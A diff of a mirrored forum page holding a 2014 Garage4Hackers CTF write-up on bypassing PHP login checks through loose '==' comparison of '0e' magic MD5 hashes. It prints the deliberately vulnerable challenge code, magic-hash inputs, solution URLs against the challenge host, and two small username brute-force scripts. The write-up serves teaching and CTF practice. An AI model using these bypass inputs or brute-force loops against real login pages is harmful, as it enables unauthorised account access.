@@ -1,28 +1,25 @@
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml" dir="ltr" lang="en" id="vbulletin_html">
+<html dir="ltr" id="vbulletin_html" lang="en" xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml"><!-- Mirrored from garage4hackers.com/printthread.php?t=6153&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 13:40:31 GMT --><!-- Added by HTTrack --><head><meta content="text/html;charset=utf-8" http-equiv="content-type"/><!-- /Added by HTTrack -->
 
-<!-- Mirrored from garage4hackers.com/printthread.php?t=6153&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 13:40:31 GMT -->
-<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=ISO-8859-1" /><!-- /Added by HTTrack -->
-<head>
-	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
-	<base  /><!--[if IE]></base><![endif]-->
-	<meta name="generator" content="vBulletin 4.2.1" />
+	<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+	<base/><!--[if IE]></base><![endif]-->
+	<meta content="vBulletin 4.2.1" name="generator"/>
 
 	
-	<link rel="stylesheet" type="text/css" href="cssddc9.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,popupmenu.css,printthread.css,vbulletin.css,vbulletin-chrome.css" />
+	<link href="cssddc9.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,popupmenu.css,printthread.css,vbulletin.css,vbulletin-chrome.css" rel="stylesheet" type="text/css"/>
 	
 
 
 
 	<title> Writeup on Garage4Hackers Xmas / Dec Web Challenge 2014</title>
-	<link rel="stylesheet" type="text/css" href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" />
+	<link href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" rel="stylesheet" type="text/css"/>
 
 </head>
 <body>
 
 <div class="above_body">
-<div id="header" class="floatcontainer">
-<div><a name="top" href="forum.html" class="logo-image"><img src="images/misc/vbulletin4_logo.html" alt="Garage4hackers Forum" /></a></div>
+<div class="floatcontainer" id="header">
+<div><a class="logo-image" href="forum.html" name="top"><img alt="Garage4hackers Forum" src="images/misc/vbulletin4_logo.png"/></a></div>
 </div>
 </div>
 <div class="body_wrapper">
@@ -44,218 +41,218 @@
 		<div class="title">Writeup on Garage4Hackers Xmas / Dec Web Challenge 2014</div>
 	
 	<div class="content">
-		<blockquote class="restore">Ho Ho Ho, Xmas challenge ended. This challenge was all about of bypassing login authentication. Obviously, it was funny challenge!! And the obvious reason was password md5 hash. A footnote was there in source code. <br />
-<br />
+		<blockquote class="restore">Ho Ho Ho, Xmas challenge ended. This challenge was all about of bypassing login authentication. Obviously, it was funny challenge!! And the obvious reason was password md5 hash. A footnote was there in source code. <br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">&lt;!-- <br />
-&nbsp; &nbsp; We are so generous, see we provided you password hash to login :) 0e100132199235687421930375421091<br />
-&nbsp; &nbsp; if(0e100132199235687421930375421091 == md5($_GET['pass']))<br />
-&nbsp; &nbsp; {<br />
-&nbsp; &nbsp; &nbsp; // Simple PHP CODE Logic <br />
-&nbsp; &nbsp; }<br />
-&nbsp; ?&gt; --&gt;</code><hr />
-</div>Garage4Hackers Xmass Challenge is developed into PHP and it available to <a href="../external.html?link=https://dl.dropboxusercontent.com/u/18007092/G4HxMassEventChall.php" target="_blank">download</a> for learning purpose. <br />
-<br />
-Just a quick note: If you want to join G4H CTF team, then you PM me and checkout our last month <a href="../external.html?link=https://www.youtube.com/watch?v=Xoi5GxcD_Lg" target="_blank">Ranchoddas event</a> :) <br />
-<br />
-And I'm back to business, The main purpose of the CTF is to understand the PHP equal to (==) operator for comparing and even you can study <a href="../external.html?link=http://php.net/manual/en/function.strcmp.php" target="_blank">strcmp </a>function.  If a developer uses equal to (==) operator without measuring the risk, then it can be profitable for attacker. However, attack can be carried in rare cases only. we've received some expected result and some unexpected results but at the end both are results ;) <br />
-<br />
-There was 4k + unique Hits on the CTF page in 24 Hrs, only few submission we've valid received. <br />
-<br />
-Following is list of ninja, who solved the challenge in the time. <br />
- <br />
+	<hr/><code class="bbcode_code">&lt;!-- <br/>
+    We are so generous, see we provided you password hash to login :) 0e100132199235687421930375421091<br/>
+    if(0e100132199235687421930375421091 == md5($_GET['pass']))<br/>
+    {<br/>
+      // Simple PHP CODE Logic <br/>
+    }<br/>
+  ?&gt; --&gt;</code><hr/>
+</div>Garage4Hackers Xmass Challenge is developed into PHP and it available to <a href="../external.html?link=https://dl.dropboxusercontent.com/u/18007092/G4HxMassEventChall.php" target="_blank">download</a> for learning purpose. <br/>
+<br/>
+Just a quick note: If you want to join G4H CTF team, then you PM me and checkout our last month <a href="../external.html?link=https://www.youtube.com/watch?v=Xoi5GxcD_Lg" target="_blank">Ranchoddas event</a> :) <br/>
+<br/>
+And I'm back to business, The main purpose of the CTF is to understand the PHP equal to (==) operator for comparing and even you can study <a href="../external.html?link=http://php.net/manual/en/function.strcmp.php" target="_blank">strcmp </a>function.  If a developer uses equal to (==) operator without measuring the risk, then it can be profitable for attacker. However, attack can be carried in rare cases only. we've received some expected result and some unexpected results but at the end both are results ;) <br/>
+<br/>
+There was 4k + unique Hits on the CTF page in 24 Hrs, only few submission we've valid received. <br/>
+<br/>
+Following is list of ninja, who solved the challenge in the time. <br/>
+ <br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">jinmo123&nbsp; - Good Solution but not expected<br />
-tlk ( https://twitter.com/tlk___ ) - Nice Solution, but Not expected<br />
-stypr (https://stypr.com) - W00tt , expected solution&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br />
-Ajin Abraham - Nice Solution, but Not expected<br />
-sagar popat&nbsp; - Nice Solution, but Not expected<br />
-Sharath Unni - W00tt , expected solution</code><hr />
-</div>There was three way to solve this CTF and expected way to solve the challenge is to bypass authentication by using PHP equal to (==) operator. Brute forcing username is second easy way to solve the challenge and last way was monkey testing. ( Just kidding ;) )<br />
-<br />
-<b>PHP CTF Code: </b><br />
-<br />
+	<hr/><code class="bbcode_code">jinmo123  - Good Solution but not expected<br/>
+tlk ( https://twitter.com/tlk___ ) - Nice Solution, but Not expected<br/>
+stypr (https://stypr.com) - W00tt , expected solution                <br/>
+Ajin Abraham - Nice Solution, but Not expected<br/>
+sagar popat  - Nice Solution, but Not expected<br/>
+Sharath Unni - W00tt , expected solution</code><hr/>
+</div>There was three way to solve this CTF and expected way to solve the challenge is to bypass authentication by using PHP equal to (==) operator. Brute forcing username is second easy way to solve the challenge and last way was monkey testing. ( Just kidding ;) )<br/>
+<br/>
+<b>PHP CTF Code: </b><br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">&lt;?php <br />
-error_reporting(0);<br />
-$a = htmlentities($_GET['username']);&nbsp; <br />
-$c = htmlentities($_GET['password']);<br />
-$b = md5($c);<br />
-if (!empty($a) AND !empty($b)) { // empty function made this CTF more easy<br />
-&nbsp;if (&quot;0e100132199235687421930375421091&quot; == $b) { // vulnerable line<br />
-&nbsp; &nbsp; if ($b ===&quot;0e100132199235687421930375421091&quot;) {&nbsp; // To Avoiding some bugs and change behavior of CTF <br />
-&nbsp; &nbsp;  if (&quot;133E-1337&quot; === $a) {// To Avoiding some bugs and change behavior of CTF <br />
-&nbsp; &nbsp; &nbsp; &nbsp; print &quot;Flag : Garage4H4x0rFlagPhpFlag1337&quot;;&nbsp; &nbsp; <br />
-&nbsp; &nbsp; &nbsp; }else{<br />
-&nbsp; &nbsp; &nbsp; &nbsp; print &quot;umm!! nice try dude :), oops! you don't know username&quot;;<br />
-&nbsp; &nbsp; &nbsp; }<br />
-&nbsp; &nbsp; }else{<br />
-&nbsp; &nbsp; &nbsp; if ($a ===&quot;0e100132199235687421930375421091&quot;) {// To Avoiding some bugs and change behavior of CTF <br />
-&nbsp; &nbsp; &nbsp;  print &quot;umm!! nice try dude :), oops! &quot;;<br />
-&nbsp; &nbsp; &nbsp; }else{<br />
-&nbsp; &nbsp; &nbsp; &nbsp; if (&quot;133E-1337&quot; == $a) { // vulnerable line<br />
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print &quot;Flag : Garage4H4x0rFlagPhpFlag1337&quot;;&nbsp; &nbsp; <br />
-&nbsp; &nbsp; &nbsp; &nbsp; }else{<br />
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Print &quot;Wrong Username&quot;;&nbsp; &nbsp; &nbsp; <br />
-&nbsp; &nbsp; &nbsp; &nbsp; } <br />
-&nbsp; &nbsp; }<br />
-&nbsp; &nbsp; &nbsp; }&nbsp; <br />
-&nbsp; }else{<br />
-&nbsp; &nbsp; Print &quot;wrong&nbsp; Password&quot;;<br />
-&nbsp; }&nbsp; <br />
-}<br />
-?&gt;</code><hr />
-</div>Here is some story about PHP operator and expected Behavior of PHP equal to operator. <br />
-<br />
+	<hr/><code class="bbcode_code">&lt;?php <br/>
+error_reporting(0);<br/>
+$a = htmlentities($_GET['username']);  <br/>
+$c = htmlentities($_GET['password']);<br/>
+$b = md5($c);<br/>
+if (!empty($a) AND !empty($b)) { // empty function made this CTF more easy<br/>
+ if ("0e100132199235687421930375421091" == $b) { // vulnerable line<br/>
+    if ($b ==="0e100132199235687421930375421091") {  // To Avoiding some bugs and change behavior of CTF <br/>
+     if ("133E-1337" === $a) {// To Avoiding some bugs and change behavior of CTF <br/>
+        print "Flag : Garage4H4x0rFlagPhpFlag1337";    <br/>
+      }else{<br/>
+        print "umm!! nice try dude :), oops! you don't know username";<br/>
+      }<br/>
+    }else{<br/>
+      if ($a ==="0e100132199235687421930375421091") {// To Avoiding some bugs and change behavior of CTF <br/>
+       print "umm!! nice try dude :), oops! ";<br/>
+      }else{<br/>
+        if ("133E-1337" == $a) { // vulnerable line<br/>
+          print "Flag : Garage4H4x0rFlagPhpFlag1337";    <br/>
+        }else{<br/>
+          Print "Wrong Username";      <br/>
+        } <br/>
+    }<br/>
+      }  <br/>
+  }else{<br/>
+    Print "wrong  Password";<br/>
+  }  <br/>
+}<br/>
+?&gt;</code><hr/>
+</div>Here is some story about PHP operator and expected Behavior of PHP equal to operator. <br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">Input&nbsp; &nbsp; &nbsp;  | Output<br />
--------------------------<br />
-&quot;0&quot; == &quot;0&quot; | True<br />
-&quot;1&quot; == &quot;0&quot; | False <br />
--------------------------</code><hr />
-</div><br />
-Unexpected Behavior of PHP equal to operator. <br />
-<br />
+	<hr/><code class="bbcode_code">Input       | Output<br/>
+-------------------------<br/>
+"0" == "0" | True<br/>
+"1" == "0" | False <br/>
+-------------------------</code><hr/>
+</div><br/>
+Unexpected Behavior of PHP equal to operator. <br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">Input&nbsp; &nbsp; &nbsp;  | Output<br />
--------------------------<br />
-&quot;0e1&quot; == &quot;0&quot; | True<br />
--------------------------</code><hr />
-</div>In detailed : <br />
-<b>PHP consider it as scientific notation 0e1 = 0 * 10 ^ 1 and ANS is 0</b><br />
-<br />
+	<hr/><code class="bbcode_code">Input       | Output<br/>
+-------------------------<br/>
+"0e1" == "0" | True<br/>
+-------------------------</code><hr/>
+</div>In detailed : <br/>
+<b>PHP consider it as scientific notation 0e1 = 0 * 10 ^ 1 and ANS is 0</b><br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code"> &lt;?php <br />
-&nbsp;  var_dump(&quot;0e1&quot; == 0);<br />
-&nbsp;?&gt;</code><hr />
+	<hr/><code class="bbcode_code"> &lt;?php <br/>
+   var_dump("0e1" == 0);<br/>
+ ?&gt;</code><hr/>
 </div><div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">Finding entry points<br />
-Branch analysis from position: 0<br />
-Return found<br />
-filename:&nbsp; &nbsp; &nbsp;  /in/Pvj4s<br />
-function name:&nbsp; (null)<br />
-number of ops:&nbsp; 4<br />
-compiled vars:&nbsp; none<br />
-line&nbsp; &nbsp;  # *&nbsp; op&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  fetch&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ext&nbsp; return&nbsp; operands<br />
----------------------------------------------------------------------------------<br />
-&nbsp;  2&nbsp; &nbsp;  0&nbsp; &gt;&nbsp;  IS_EQUAL&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  ~0&nbsp; &nbsp; &nbsp; '0e1', 0<br />
-&nbsp; &nbsp; &nbsp; &nbsp;  1&nbsp; &nbsp; &nbsp; SEND_VAL&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  ~0<br />
-&nbsp; &nbsp; &nbsp; &nbsp;  2&nbsp; &nbsp; &nbsp; DO_FCALL&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 1&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 'var_dump'<br />
-&nbsp; &nbsp; &nbsp; &nbsp;  3&nbsp; &nbsp; &gt; RETURN&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  1</code><hr />
-</div>Here is the fun start, this is just plain text comparison and check out the following MD5 Hash, and most of developer use it as passwords. <br />
-<br />
+	<hr/><code class="bbcode_code">Finding entry points<br/>
+Branch analysis from position: 0<br/>
+Return found<br/>
+filename:       /in/Pvj4s<br/>
+function name:  (null)<br/>
+number of ops:  4<br/>
+compiled vars:  none<br/>
+line     # *  op                           fetch          ext  return  operands<br/>
+---------------------------------------------------------------------------------<br/>
+   2     0  &gt;   IS_EQUAL                                         ~0      '0e1', 0<br/>
+         1      SEND_VAL                                                 ~0<br/>
+         2      DO_FCALL                                      1          'var_dump'<br/>
+         3    &gt; RETURN                                                   1</code><hr/>
+</div>Here is the fun start, this is just plain text comparison and check out the following MD5 Hash, and most of developer use it as passwords. <br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">var_dump(0e100132199235687421930375421091 == md5(urldecode('%02%a27%84')));<br />
-&nbsp;bool(true) // w00t :)</code><hr />
+	<hr/><code class="bbcode_code">var_dump(0e100132199235687421930375421091 == md5(urldecode('%02%a27%84')));<br/>
+ bool(true) // w00t :)</code><hr/>
 </div>Another string : <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">'\x98-\xde\x1f'</code><hr />
-</div>    // Submission by Beched (@ahack_ru)<br />
-<br />
-try here : <a href="../external.html?link=http://3v4l.org/NK5hp" target="_blank">http://3v4l.org/NK5hp</a><br />
-<br />
-In our check was too simple to bypass, because we haven't put quotes around the hash. It made it to be integer, which causes expression to be true with any hash, which does not start with [1-9].<br />
-<br />
-Here is bypass if we use quote around hash: <br />
+	<hr/><code class="bbcode_code">'\x98-\xde\x1f'</code><hr/>
+</div>    // Submission by Beched (@ahack_ru)<br/>
+<br/>
+try here : <a href="../external.html?link=http://3v4l.org/NK5hp" target="_blank">http://3v4l.org/NK5hp</a><br/>
+<br/>
+In our check was too simple to bypass, because we haven't put quotes around the hash. It made it to be integer, which causes expression to be true with any hash, which does not start with [1-9].<br/>
+<br/>
+Here is bypass if we use quote around hash: <br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">php &gt; var_dump('0e100132199235687421930375421091'==md5(&quot;\x0e\xd7\xb6\xea&quot;));&nbsp;  // Submission by Beched (@ahack_ru)<br />
-bool(true)</code><hr />
-</div>Try here : <a href="../external.html?link=http://3v4l.org/M9dpY" target="_blank">http://3v4l.org/M9dpY</a><br />
-<br />
-Here is another simple example, which can be found on the internet. <br />
+	<hr/><code class="bbcode_code">php &gt; var_dump('0e100132199235687421930375421091'==md5("\x0e\xd7\xb6\xea"));   // Submission by Beched (@ahack_ru)<br/>
+bool(true)</code><hr/>
+</div>Try here : <a href="../external.html?link=http://3v4l.org/M9dpY" target="_blank">http://3v4l.org/M9dpY</a><br/>
+<br/>
+Here is another simple example, which can be found on the internet. <br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">http://3v4l.org/2vrMi</code><hr />
-</div>While testing this CTF there is MD5 collision found by Sharath Unni <br />
-<br />
+	<hr/><code class="bbcode_code">http://3v4l.org/2vrMi</code><hr/>
+</div>While testing this CTF there is MD5 collision found by Sharath Unni <br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">0e100132199235687421930375421091 (Found in HTML source code )<br />
-0e104142395260374396839196939683 (MD5 collision )</code><hr />
+	<hr/><code class="bbcode_code">0e100132199235687421930375421091 (Found in HTML source code )<br/>
+0e104142395260374396839196939683 (MD5 collision )</code><hr/>
 </div>Both these hashes have the same plaintext equivalent: 26177715789 , you can decrypt MD5 here <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code"> http://www.md5online.org/</code><hr />
-</div> . <br />
-<br />
-This was all about PHP Equal operator, now what is solution of this CTF.<br />
-<br />
-Here is solution and you find many more ways: <br />
-<br />
+	<hr/><code class="bbcode_code"> http://www.md5online.org/</code><hr/>
+</div> . <br/>
+<br/>
+This was all about PHP Equal operator, now what is solution of this CTF.<br/>
+<br/>
+Here is solution and you find many more ways: <br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">http://162.208.48.16/?username=0e57640477961333848717747276704&amp;password=BRTKUJZ&amp;submit=Login&amp;debug=true<br />
-http://162.208.48.16/?username=0e1&amp;password=NOOPCJF&amp;submit=Login&amp;debug=true<br />
-http://162.208.48.16/?username=0e2&amp;password=26177715789&amp;submit=Login&amp;debug=true</code><hr />
-</div><br />
-<b>Submission by jinmo123  </b><br />
+	<hr/><code class="bbcode_code">http://162.208.48.16/?username=0e57640477961333848717747276704&amp;password=BRTKUJZ&amp;submit=Login&amp;debug=true<br/>
+http://162.208.48.16/?username=0e1&amp;password=NOOPCJF&amp;submit=Login&amp;debug=true<br/>
+http://162.208.48.16/?username=0e2&amp;password=26177715789&amp;submit=Login&amp;debug=true</code><hr/>
+</div><br/>
+<b>Submission by jinmo123  </b><br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">http://162.208.48.16/?username=000&amp;password=240610708&amp;submit=Login#</code><hr />
-</div><b>Submission by tlk ( <a href="../external.html?link=https://twitter.com/tlk___" target="_blank">https://twitter.com/tlk___</a> ) </b><br />
-<br />
-Brute Force Script: <br />
-<br />
+	<hr/><code class="bbcode_code">http://162.208.48.16/?username=000&amp;password=240610708&amp;submit=Login#</code><hr/>
+</div><b>Submission by tlk ( <a href="../external.html?link=https://twitter.com/tlk___" target="_blank">https://twitter.com/tlk___</a> ) </b><br/>
+<br/>
+Brute Force Script: <br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">import requests<br />
-s = requests.session()<br />
-for i in range(255):<br />
-&nbsp; &nbsp; r = s.get(&quot;http://162.208.48.16/?username=&quot;+chr(i)+&quot;&amp;password=QNKCDZO&amp;submit=Login&quot;)<br />
-&nbsp; &nbsp; print len(r.content), chr(i), i, &quot;Wrong Username&quot; in r.content<br />
-We can see that only #, &amp; and 0 not contains &quot;Wrong Username&quot;. let's try to prepend '0' :<br />
-&nbsp; &nbsp; r = s.get(&quot;http://162.208.48.16/?username=0&quot;+chr(i)+&quot;&amp;password=QNKCDZO&amp;submit=Login&quot;)</code><hr />
+	<hr/><code class="bbcode_code">import requests<br/>
+s = requests.session()<br/>
+for i in range(255):<br/>
+    r = s.get("http://162.208.48.16/?username="+chr(i)+"&amp;password=QNKCDZO&amp;submit=Login")<br/>
+    print len(r.content), chr(i), i, "Wrong Username" in r.content<br/>
+We can see that only #, &amp; and 0 not contains "Wrong Username". let's try to prepend '0' :<br/>
+    r = s.get("http://162.208.48.16/?username=0"+chr(i)+"&amp;password=QNKCDZO&amp;submit=Login")</code><hr/>
 </div><div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">http://162.208.48.16/?username=0.0&amp;password=QNKCDZO&amp;submit=Login</code><hr />
-</div><b>Two Submission by stypr (<a href="../external.html?link=https://stypr.com/" target="_blank">https://stypr.com</a>) </b><br />
-<br />
+	<hr/><code class="bbcode_code">http://162.208.48.16/?username=0.0&amp;password=QNKCDZO&amp;submit=Login</code><hr/>
+</div><b>Two Submission by stypr (<a href="../external.html?link=https://stypr.com/" target="_blank">https://stypr.com</a>) </b><br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">http://162.208.48.16/?username=0e57640477961333848717747276704&amp;password=BRTKUJZ&amp;submit=Login&amp;debug=true<br />
-http://162.208.48.16/?username=0x00&amp;password=BRTKUJZ&amp;submit=Login&amp;debug=true</code><hr />
-</div><b>Submission by Ajin Abraham</b><br />
-<br />
+	<hr/><code class="bbcode_code">http://162.208.48.16/?username=0e57640477961333848717747276704&amp;password=BRTKUJZ&amp;submit=Login&amp;debug=true<br/>
+http://162.208.48.16/?username=0x00&amp;password=BRTKUJZ&amp;submit=Login&amp;debug=true</code><hr/>
+</div><b>Submission by Ajin Abraham</b><br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">import urllib2<br />
-with open(&quot;10k most common.txt&quot;,&quot;r&quot;) as f:<br />
-&nbsp; &nbsp; url='http://162.208.48.16/?username=[X]&amp;password=26177715789'<br />
-&nbsp; &nbsp; no=0<br />
-&nbsp; &nbsp; for line in f:<br />
-&nbsp; &nbsp; &nbsp; &nbsp; turl=url.replace(&quot;[X]&quot;,line).replace(&quot;\n&quot;,&quot;&quot;).replace(&quot;\r&quot;,&quot;&quot;)<br />
-&nbsp; &nbsp; &nbsp; &nbsp; response = urllib2.urlopen(turl)<br />
-&nbsp; &nbsp; &nbsp; &nbsp; html = response.read()<br />
-&nbsp; &nbsp; &nbsp; &nbsp; dat=html[:50]<br />
-&nbsp; &nbsp; &nbsp; &nbsp; no+=1<br />
-&nbsp; &nbsp; &nbsp; &nbsp; log= str(no)+&quot; Username: &quot;+ line +&quot;Response: &quot;+ dat<br />
-&nbsp; &nbsp; &nbsp; &nbsp; if (&quot;Wrong&quot; in log):<br />
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print no<br />
-&nbsp; &nbsp; &nbsp; &nbsp; else:<br />
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print log<br />
-response.close()</code><hr />
+	<hr/><code class="bbcode_code">import urllib2<br/>
+with open("10k most common.txt","r") as f:<br/>
+    url='http://162.208.48.16/?username=[X]&amp;password=26177715789'<br/>
+    no=0<br/>
+    for line in f:<br/>
+        turl=url.replace("[X]",line).replace("\n","").replace("\r","")<br/>
+        response = urllib2.urlopen(turl)<br/>
+        html = response.read()<br/>
+        dat=html[:50]<br/>
+        no+=1<br/>
+        log= str(no)+" Username: "+ line +"Response: "+ dat<br/>
+        if ("Wrong" in log):<br/>
+            print no<br/>
+        else:<br/>
+            print log<br/>
+response.close()</code><hr/>
 </div><div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">URL:http://162.208.48.16/?username=-0&amp;password=26177715789</code><hr />
-</div><b>Submission by Sagar Popat</b><br />
-<br />
+	<hr/><code class="bbcode_code">URL:http://162.208.48.16/?username=-0&amp;password=26177715789</code><hr/>
+</div><b>Submission by Sagar Popat</b><br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">http://162.208.48.16/?username=00&amp;password=26177715789&amp;submit=Login</code><hr />
-</div><br />
-<b>Submission by Sharath Unni </b><br />
-<br />
+	<hr/><code class="bbcode_code">http://162.208.48.16/?username=00&amp;password=26177715789&amp;submit=Login</code><hr/>
+</div><br/>
+<b>Submission by Sharath Unni </b><br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">http://162.208.48.16/?username=0e12323&amp;password=26177715789&amp;submit=Login</code><hr />
+	<hr/><code class="bbcode_code">http://162.208.48.16/?username=0e12323&amp;password=26177715789&amp;submit=Login</code><hr/>
 </div>Thats all for today :) Thank you for reading .</blockquote>
 	</div>
 </li><li class="postbit blockbody" id="post_2">
@@ -266,7 +263,7 @@ response.close()</code><hr />
 	
 	
 	<div class="content">
-		<blockquote class="restore">thanks for this .. we learn lot <br />
+		<blockquote class="restore">thanks for this .. we learn lot <br/>
 looking forward more .... so we can learn :p</blockquote>
 	</div>
 </li>
@@ -275,14 +272,14 @@ looking forward more .... so we can learn :p</blockquote>
 
 </div>
 <div class="below_body">
-<div id="footer_time" class="footer_time">All times are GMT +5.5. The time now is <span class="time">04:24 PM</span>.</div>
+<div class="footer_time" id="footer_time">All times are GMT +5.5. The time now is <span class="time">04:24 PM</span>.</div>
 
-<div id="footer_copyright" class="footer_copyright">
+<div class="footer_copyright" id="footer_copyright">
 	<!-- Do not remove this copyright notice -->
-	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin&reg;</a> Version 4.2.1 <br />Copyright &copy; 2020 vBulletin Solutions, Inc. All rights reserved. 
+	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin®</a> Version 4.2.1 <br/>Copyright © 2020 vBulletin Solutions, Inc. All rights reserved. 
 	<!-- Do not remove this copyright notice -->	
 </div>
-<div id="footer_morecopyright" class="footer_morecopyright">
+<div class="footer_morecopyright" id="footer_morecopyright">
 	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
 	
 	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
@@ -300,7 +297,7 @@ try{
 var pageTracker = _gat._getTracker('UA-17311051-3');
 pageTracker._trackPageview();
 } catch(err) {}</script>
-</body>
 
-<!-- Mirrored from garage4hackers.com/printthread.php?t=6153&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 13:40:31 GMT -->
-</html>
+
+
+</body><!-- Mirrored from garage4hackers.com/printthread.php?t=6153&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 13:40:31 GMT --></html>
